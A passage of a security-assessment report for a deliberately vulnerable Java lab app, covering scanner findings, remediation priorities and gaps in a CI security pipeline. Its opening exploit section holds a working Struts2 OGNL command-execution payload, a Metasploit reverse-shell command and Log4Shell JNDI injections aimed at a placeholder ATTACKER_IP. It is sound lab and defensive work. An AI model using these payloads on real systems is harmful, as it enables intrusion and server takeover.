+(#_memberAccess?(#_memberAccess=#dm):\
+((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
+(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
+(#ognlUtil.getExcludedPackageNames().clear()).\
+(#ognlUtil.getExcludedClasses().clear()).\
+(#context.setMemberAccess(#dm)))).\
+(#cmd='id').\
+(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\
+(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).\
+(#p=new java.lang.ProcessBuilder(#cmds)).\
+(#p.redirectErrorStream(true)).\
+(#process=#p.start()).\
+(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\
+(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\
+(#ros.flush())}" \
+"http://dvja:8080/"
+```
+
+**Alternative using Metasploit:**
+```bash
+msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; \
+set RHOSTS dvja; set RPORT 8080; set TARGETURI /; \
+set PAYLOAD linux/x64/meterpreter/reverse_tcp; \
+set LHOST ATTACKER_IP; exploit"
+```
+
+**Expected result:** The server executes the injected command and returns the output. This vulnerability was responsible for the 2017 Equifax breach.
+
+---
+
+### Exploit #10: Log4Shell — CVE-2021-44228 (matches Issue #5)
+
+**Target:** Any input that gets logged (login forms, search, headers)
+**CWE:** CWE-917 (Expression Language Injection)
+
+```bash
+# Step 1: Start LDAP listener (using marshalsec or similar)
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"
+
+# Step 2: Inject JNDI payload via login field
+curl "http://dvja:8080/userSearch.action" \
+  --data-urlencode 'login=${jndi:ldap://ATTACKER_IP:1389/exploit}'
+
+# Step 3: Inject via User-Agent header (if headers are logged)
+curl -H 'User-Agent: ${jndi:ldap://ATTACKER_IP:1389/exploit}' \
+  "http://dvja:8080/"
+
+# Detection (non-exploiting test with DNS callback)
+curl "http://dvja:8080/userSearch.action" \
+  --data-urlencode 'login=${jndi:ldap://YOUR_BURP_COLLABORATOR_ID.oastify.com/test}'
+```
+
+**Expected result:** The Log4j library resolves the JNDI reference, connecting to the attacker's LDAP server, which serves a malicious Java class that gets loaded and executed on the target server.
+
+---
+
+## 8. Recommendations
+
+### 8.1 Pipeline Improvements
+
+| Gap | Recommendation |
+|-----|----------------|
+| XSS not detected | Add custom CodeQL queries for JSP scriptlet output (`<%= %>`) and Struts2 `escape="false"` patterns |
+| IDOR not detected | Add DAST scanning (e.g., OWASP ZAP, Burp Suite) to the pipeline for authorization testing |
+| CSRF not detected | Add a custom query or DAST check for absence of anti-CSRF tokens on state-changing forms |
+| Broken Auth not detected | Add custom CodeQL queries for weak crypto (`MD5DigestAsHex` for passwords) and predictable tokens |
+| Open redirect not detected | Add custom CodeQL query for Struts2 redirect result types with user-controlled URLs |
+| Access control not detected | Implement DAST scans with authenticated and unauthenticated sessions to compare access |
+| Configuration issues not detected | Add configuration scanning (e.g., `struts.devMode` checks, hardcoded secrets in properties) |
+
+### 8.2 Remediation Priority
+
+| Priority | Vulnerability | Fix |
+|----------|--------------|-----|
+| **P0 — Immediate** | Struts2 CVE-2017-5638 (RCE) | Upgrade `struts2.version` to 6.4.0+ in `pom.xml` |
+| **P0 — Immediate** | Log4Shell CVE-2021-44228 (RCE) | Upgrade `log4j2.version` to 2.17.1+ in `pom.xml`; remove log4j 1.x |
+| **P0 — Immediate** | Command Injection | Use `ProcessBuilder` with argument array (no shell) |
+| **P0 — Immediate** | SQL Injection | Use parameterized queries with `:param` syntax |
+| **P1 — High** | Broken Auth (predictable token) | Implement `SecureRandom`-based tokens stored in DB |
+| **P1 — High** | Password hashing (MD5) | Migrate to bcrypt/scrypt/Argon2 with salt |
+| **P1 — High** | XSS (reflected + stored) | Use `<s:property>` with escaping; remove `escape="false"` |
+| **P1 — High** | IDOR | Validate that `userId` matches the authenticated session user |
+| **P1 — High** | Admin bypass | Replace cookie check with session-based `isAdmin()` check |
+| **P2 — Medium** | Open Redirect | Validate URL starts with `/` (internal only) |
+| **P2 — Medium** | CSRF | Implement Struts2 `TokenSessionInterceptor` |
+| **P2 — Medium** | Sensitive data in logs | Remove password from log statements |
+| **P2 — Medium** | devMode=true | Set `struts.devMode=false` in production |
+| **P3 — Low** | Remaining dependency updates | Update all dependencies to latest stable versions |
+
+---
+
+## Appendix A: Complete Issue Inventory
+
+### A.1 SAST — CodeQL (Issues #21–24)
+
+| # | Type | Severity | Title | True/False Positive |
+|---|------|----------|-------|-------------------|
+| 21 | CODE | CRITICAL | Uncontrolled command line — 1 location | TRUE POSITIVE |
+| 22 | CODE | HIGH | SQL Injection — 2 locations | TRUE POSITIVE |
+| 23 | CODE | HIGH | Sensitive info in logs — 1 location | TRUE POSITIVE |
+| 24 | CODE | HIGH | Log Injection — 4 locations | TRUE POSITIVE |
+
+### A.2 SCA — Trivy Dependencies (Issues #1–20)
+
+| # | Type | Severity | Title | True/False Positive |
+|---|------|----------|-------|-------------------|
+| 1 | DEPENDENCY | CRITICAL | commons-collections 3.1 — 2 CVEs | TRUE POSITIVE |
+| 2 | DEPENDENCY | CRITICAL | commons-fileupload 1.3.2 — 3 CVEs | TRUE POSITIVE |
+| 3 | DEPENDENCY | CRITICAL | dom4j 1.6.1 — 2 CVEs | TRUE POSITIVE |
+| 4 | DEPENDENCY | CRITICAL | log4j 1.2.14 — 6 CVEs | TRUE POSITIVE |
+| 5 | DEPENDENCY | CRITICAL | log4j-core 2.3 — 4 CVEs | TRUE POSITIVE |
+| 6 | DEPENDENCY | CRITICAL | struts2-core 2.3.30 — 17 CVEs | TRUE POSITIVE |
+| 7 | DEPENDENCY | CRITICAL | spring-beans 3.0.5 — 2 CVEs | TRUE POSITIVE |
+| 8 | DEPENDENCY | CRITICAL | spring-web 3.0.5 — 4 CVEs | TRUE POSITIVE |
+| 9 | DEPENDENCY | HIGH | gson 2.8.1 — 1 CVE | TRUE POSITIVE |
+| 10 | DEPENDENCY | HIGH | commons-beanutils 1.7.0 — 2 CVEs | TRUE POSITIVE |
+| 11 | DEPENDENCY | HIGH | commons-io 2.2 — 1 CVE | TRUE POSITIVE |
+| 12 | DEPENDENCY | HIGH | mysql-connector-java 5.1.42 — 2 CVEs | TRUE POSITIVE |
+| 13 | DEPENDENCY | HIGH | xwork-core 2.3.30 — 1 CVE | TRUE POSITIVE |
+| 14 | DEPENDENCY | HIGH | struts-core 1.3.8 — 4 CVEs | TRUE POSITIVE |
+| 15 | DEPENDENCY | HIGH | struts-tiles 1.3.8 — 1 CVE | TRUE POSITIVE |
+| 16 | DEPENDENCY | HIGH | velocity 1.6.2 — 1 CVE | TRUE POSITIVE |
+| 17 | DEPENDENCY | HIGH | hibernate-core 3.3.1.GA — 1 CVE | TRUE POSITIVE |
+| 18 | DEPENDENCY | HIGH | spring-context 3.0.5 — 1 CVE | TRUE POSITIVE |
+| 19 | DEPENDENCY | HIGH | spring-core 3.0.5 — 4 CVEs | TRUE POSITIVE |
+| 20 | DEPENDENCY | HIGH | spring-expression 3.0.5 — 1 CVE | TRUE POSITIVE |
+
+### A.3 Container Scan — Trivy Image (Issues #25–49)
+
+| # | Type | Severity | Title | True/False Positive |
+|---|------|----------|-------|-------------------|
+| 25 | CONTAINER | CRITICAL | xstream 1.4.10 — 23 CVEs | TRUE POSITIVE |
+| 26 | CONTAINER | CRITICAL | commons-collections 3.1 — 8 CVEs | TRUE POSITIVE |
+| 27 | CONTAINER | CRITICAL | commons-fileupload 1.3.2 — 9 CVEs | TRUE POSITIVE |
+| 28 | CONTAINER | CRITICAL | dom4j 1.6.1 — 6 CVEs | TRUE POSITIVE |
+| 29 | CONTAINER | CRITICAL | log4j 1.2.14 — 24 CVEs | TRUE POSITIVE |
+| 30 | CONTAINER | CRITICAL | log4j-core 2.3 — 12 CVEs | TRUE POSITIVE |
+| 31 | CONTAINER | CRITICAL | maven-shared-utils 0.1 — 1 CVE | TRUE POSITIVE |
+| 32 | CONTAINER | CRITICAL | maven-core 3.0.4 — 3 CVEs | TRUE POSITIVE |
+| 33 | CONTAINER | CRITICAL | struts2-core 2.3.30 — 51 CVEs | TRUE POSITIVE |
+| 34 | CONTAINER | CRITICAL | plexus-utils 3.0.15 — 14 CVEs | TRUE POSITIVE |
+| 35 | CONTAINER | CRITICAL | spring-beans 3.0.5 — 6 CVEs | TRUE POSITIVE |
+| 36 | CONTAINER | CRITICAL | spring-web 3.0.5 — 12 CVEs | TRUE POSITIVE |
+| 37 | CONTAINER | HIGH | gson 2.8.1 — 3 CVEs | TRUE POSITIVE |
+| 38 | CONTAINER | HIGH | commons-beanutils 1.7.0 — 6 CVEs | TRUE POSITIVE |
+| 39 | CONTAINER | HIGH | commons-io 2.2 — 4 CVEs | TRUE POSITIVE |
+| 40 | CONTAINER | HIGH | mysql-connector-java 5.1.42 — 6 CVEs | TRUE POSITIVE |
+| 41 | CONTAINER | HIGH | xwork-core 2.3.30 — 3 CVEs | TRUE POSITIVE |
+| 42 | CONTAINER | HIGH | struts-core 1.3.8 — 12 CVEs | TRUE POSITIVE |
+| 43 | CONTAINER | HIGH | struts-tiles 1.3.8 — 3 CVEs | TRUE POSITIVE |
+| 44 | CONTAINER | HIGH | velocity 1.6.2 — 3 CVEs | TRUE POSITIVE |
+| 45 | CONTAINER | HIGH | plexus-archiver 2.1 — 2 CVEs | TRUE POSITIVE |
+| 46 | CONTAINER | HIGH | hibernate-core 3.3.1.GA — 3 CVEs | TRUE POSITIVE |
+| 47 | CONTAINER | HIGH | spring-context 3.0.5 — 3 CVEs | TRUE POSITIVE |
+| 48 | CONTAINER | HIGH | spring-core 3.0.5 — 12 CVEs | TRUE POSITIVE |
+| 49 | CONTAINER | HIGH | spring-expression 3.0.5 — 3 CVEs | TRUE POSITIVE |
+
+---
+
+## Appendix B: Vulnerability Categories Not in Solution Docs But Found by Pipeline
+
+| Pipeline Issue | Category | Notes |
+|---------------|----------|-------|
+| #24 — Log Injection (CWE-117) | Log Tampering | Related to A6 but distinct. Attackers can forge log entries by injecting newlines. |
+| #1 — commons-collections | Deserialization RCE | Not in solutions. Known Java deserialization gadget chain. |
+| #2 — commons-fileupload | RCE via deserialization | Not in solutions. Struts2 dependency. |
+| #3 — dom4j | XXE | Not in solutions. Transitive via Hibernate. |
+| #4 — log4j 1.x | Multiple RCEs | Not in solutions. Legacy logging dependency. |
+| #5 — log4j-core (Log4Shell) | RCE | Not in solutions. One of the most critical CVEs in history. |
+| #7 — spring-beans | Spring4Shell | Not in solutions. Not exploitable on JDK 8. |
+| #8 — spring-web | Deserialization RCE | Not in solutions. Conditional exploitability. |
+| #9–#20 | Various | Various HIGH-severity dependency vulnerabilities not in solutions. |
+
+---
+
+## Appendix C: Pipeline Gap Analysis — Root Causes and Recommendations
+
+### C.1 Gitleaks — Zero Findings Explained
+
+**Observed behavior:** Gitleaks ran successfully but reported "no leaks found" despite hardcoded credentials existing in `config.properties` and `docker-compose.yml`.
+
+**Root cause:** The repository is a fork of `appsecco/dvja`. The credentials were committed in the original repo (commit `e212a46`, Oct 2018). On `push` events, `gitleaks-action@v2` defaults to `--log-opts=-1`, scanning **only the latest commit's diff**. Since the latest commit (`8c0bd80`) only added the pipeline YAML, the credentials were never in scope.
+
+```
+gitleaks cmd: gitleaks detect ... --log-opts=-1
+executing: git -C . log -p -U0 -1       ← only 1 commit scanned
+1 commits scanned.
+no leaks found
+```
+
+This is not a fork-specific issue — any secret committed before the pipeline was installed would be invisible with incremental scanning.
+
+**Secondary concern:** Even with a full scan, the default Gitleaks ruleset may not match `mysql.password=ec95c258266b8e985848cae688effa2b` since it targets specific token formats (AWS keys, GitHub tokens, etc.), not generic password assignments in config files. A `.gitleaks.toml` with custom rules would be needed.
+
+**Remediation applied:** The pipeline now uses a two-tier scanning strategy:
+
+| Trigger | Scan Scope | Purpose |
+|---------|-----------|---------|
+| `push` to any branch | Last commit only (incremental via gitleaks-action) | Catch new secrets in real-time |
+| `pull_request` to main/master | Full file scan (`--no-git`) | Gate merges — ensure no secrets exist in the current codebase |
+
+The `--no-git` flag bypasses git history entirely and scans all files on disk. This is faster than a full history scan and catches any secret currently present in the repo, regardless of when it was committed.
+
+**For full git-history audits** (e.g., finding secrets that were committed and later removed — still in history, still need rotation), run a manual scan with `--log-opts=--all`:
+
+```bash
+# Full history audit — run manually or via workflow_dispatch
+gitleaks detect \
+  --redact \
+  -v \
+  --report-format=sarif \
+  --report-path=results.sarif \
+  --log-opts=--all
+```
+
+This scans diffs from every commit ever made (including forked/upstream commits) and will find secrets even if they were deleted in later commits. It can be slow on large repos, so it is recommended as an on-demand audit workflow rather than a per-push step. Example `workflow_dispatch` trigger for this:
+
+```yaml
+# Separate workflow: .github/workflows/secrets-audit.yml
+name: Secrets Audit (Full History)
+on:
+  workflow_dispatch:
+
+jobs:
+  full-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Install Gitleaks
+        run: |
+          curl -sSfL https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.24.3_linux_x64.tar.gz \
+            | tar xz -C /usr/local/bin
+      - name: Run full history scan
+        run: |
+          gitleaks detect \
+            --redact -v \
+            --exit-code=0 \
+            --report-format=sarif \
+            --report-path=results.sarif \
+            --log-opts=--all
+      - name: Upload report
+        uses: actions/upload-artifact@v4
+        with:
+          name: gitleaks-full-audit
+          path: results.sarif
+```
+
+### C.2 CodeQL — Missing XML and Properties File Indexing
+
+**Observed behavior:** CodeQL did not detect `struts.devMode=true` (security misconfiguration) or hardcoded credentials in `config.properties`, despite having queries for both (`java/struts-dev-mode` via PR #3945, CWE-555 for properties files).
+
+**Root cause:** The `github/codeql-action/init@v3` with `languages: java` builds a database from compiled Java bytecode. Non-Java files (`.xml`, `.properties`) are not automatically indexed into the CodeQL database unless explicitly included via `codeql database index-files --include-extension .xml --include-extension .properties`.
+
+**Remediation applied:** Added a `codeql database index-files` step between the Maven build and the CodeQL analysis, explicitly indexing `.xml` and `.properties` files into the Java database. This enables the Struts devMode and CWE-555 credential queries to find their targets.
+
+### C.3 Trivy Container Scan — Zero Findings
+
+**Observed behavior:** The Trivy container image scan completed successfully, detected Ubuntu 24.04 with 207 OS packages, but produced zero CRITICAL or HIGH findings. No `[CONTAINER]` issues were created.
+
+**Root cause (two factors):**
+
+1. **Modern base image:** The Dockerfile uses `eclipse-temurin:8-jdk` which is based on Ubuntu 24.04 LTS. The image was built with `apt-get update` at build time (March 2026), pulling the latest patches. A freshly updated Ubuntu 24.04 may genuinely have zero CRITICAL/HIGH OS-level vulnerabilities.
+
+2. **OS-only scan:** The Trivy container scan was configured with `vuln-type: 'os'`, meaning it only checked OS packages (apt/dpkg). The Java libraries packaged inside the WAR file (Struts2 2.3.30, Log4j 2.3, Spring 3.0.5, etc.) — which contain the most critical vulnerabilities — were excluded from the container scan scope.
+
+This created a blind spot: the SCA step found the vulnerable Java libraries in `pom.xml`, but the container scan couldn't verify that those same libraries were present in the deployed image, because it was only looking at the OS layer.
+
+**Remediation applied:** Changed `vuln-type` from `'os'` to `'os,library'` in both the JSON and SARIF container scan steps. This enables Trivy to scan:
+- **OS packages** (dpkg, apt) — Ubuntu base image vulnerabilities
+- **Language libraries** (Java JARs, etc.) — Struts, Log4j, Spring, and all other JARs bundled in the WAR
+
+This provides a defense-in-depth approach: SCA catches vulnerabilities at the source level (`pom.xml`), while the container scan catches them in the deployed artifact (the Docker image). If a vulnerable library is introduced outside of Maven (e.g., manually copied into the image), only the container scan would detect it.
+
+### C.4 CodeQL — MD5 Weak Hashing Not Flagged (DigestUtils)
+
+**Observed behavior:** `DigestUtils.md5DigestAsHex()` used for password hashing in `UserService.java` was not reported.
+
+**Root cause:** In November 2024, CodeQL reclassified MD5/SHA1 from `java/weak-cryptographic-algorithm` to `java/potentially-weak-cryptographic-algorithm` (precision: medium) to reduce noise from legitimate non-cryptographic uses. The query may have suppressed the finding because CodeQL couldn't confirm with high enough confidence that MD5 was being used in a cryptographic/security context.
+
+**Recommendation:** Add a custom CodeQL query or Semgrep rule that specifically flags `md5DigestAsHex` when used in methods named `*password*` or `*hash*Password*`.
+
+### C.5 Vulnerabilities Fundamentally Outside SAST/SCA Scope
+
+The following categories require **DAST** (Dynamic Application Security Testing) or **manual code review** and cannot be detected by CodeQL or Trivy regardless of configuration:
+
+| Vulnerability | Why SAST Can't Detect It |
+|--------------|-------------------------|
+| **XSS** (A3) | Data flow crosses Java → JSP scriptlet/Struts2 tag boundary; JSPs may not be compiled into CodeQL's database |
+| **IDOR** (A4) | Absence of authorization check — SAST detects dangerous patterns, not missing controls |
+| **CSRF** (A8) | Absence of anti-CSRF tokens on forms — same "missing control" problem |
+| **Cookie-based admin bypass** (A7) | Syntactically valid code; the flaw is a design decision (trusting client cookies for authz) |
+| **Open Redirect** (A10) | Data flow goes through Struts2 XML config (`${url}` in result type), breaking CodeQL taint tracking |
+| **Predictable reset token** (A2) | Business logic flaw — `MD5(username)` as reset key requires understanding the intended security model |
+
+**Recommendation:** Add OWASP ZAP (DAST) as an additional pipeline stage running against the deployed Docker container to cover these gaps.
+
+---
+
+## Appendix D: Pipeline Execution Evidence
+
+### D.1 Pipeline Runs
+
+| Run | Commit | Date | Trigger | Result | Notes |
+|-----|--------|------|---------|--------|-------|
+| #1 | `8c0bd80` | 2026-03-09 | push | ✅ Success | Initial pipeline — all jobs green. Created issues #1–24 (4 SAST + 20 SCA). Container scan found 0 issues (vuln-type was `os` only). |
+| #2 | `ca99fcb` | 2026-03-11 | push | ⚠️ Partial | Pipeline improvements (Gitleaks two-tier, CodeQL XML indexing, Trivy os+library, v4 upgrade). Container scan now found 25 issues (#25–49). CodeQL failed due to `codeql` binary not on PATH (exit code 127) — fixed in next run. |
+| #3 | *(pending)* | 2026-03-11 | push | *(pending)* | CodeQL fix (`${CODEQL_DIST}/codeql`) — expected to resolve the SAST failure. |
+
+### D.2 Evidence Collection Checklist
+
+To present complete evidence of the pipeline, capture the following from GitHub:
+
+- [ ] **GitHub Actions overview page** — screenshot showing all pipeline runs
+- [ ] **Successful pipeline run** — expand to show all 7 jobs (Build, SCA, SAST, Secrets, Docker Build, Container Scan, Issue Creation)
+- [ ] **GitHub Issues tab** — screenshot showing all 49 security issues created automatically
+- [ ] **Code Scanning alerts** (if SARIF upload succeeded) — Security → Code Scanning tab
+- [ ] **Artifacts** — downloaded SARIF/JSON reports from the pipeline run artifacts
+- [ ] **Individual job logs** — expand key steps showing scanner output (e.g., Trivy finding 51 CVEs in struts2-core)
+
+### D.3 Issue Statistics
+
+| Category | CRITICAL | HIGH | Total Issues |
+|----------|----------|------|-------------|
+| SAST (CodeQL) | 1 | 3 | 4 |
+| SCA (Trivy fs) | 8 | 12 | 20 |
+| Container (Trivy image) | 12 | 13 | 25 |
+| Secrets (Gitleaks) | 0 | 0 | 0 |
+| **Total** | **21** | **28** | **49** |
+
+### D.4 Unique CVEs Across All Scanners
+
+Total unique CVEs detected across SCA + Container scans covers vulnerabilities in:
+- **17 distinct libraries** via SCA (pom.xml analysis)
+- **25 distinct packages** via Container scan (image layer analysis)
+- **3 additional libraries** found only by container scan: xstream, plexus-utils, plexus-archiver, maven-core, maven-shared-utils
